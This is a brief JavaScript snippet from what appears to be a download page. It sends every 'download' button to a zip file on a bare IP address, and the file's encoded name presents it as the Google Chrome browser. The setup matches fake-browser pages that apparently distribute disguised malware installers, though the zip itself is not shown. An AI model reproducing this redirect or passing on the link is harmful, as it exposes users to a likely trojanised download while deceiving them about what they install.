window.onload = function() {
    // 下载链接
    let url = 'http://137.220.158.27/chetuysupe%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8.zip'

    document.querySelectorAll('.download').forEach(item => {
        item.onclick = function() {
            location.href = url
        }
    })
}
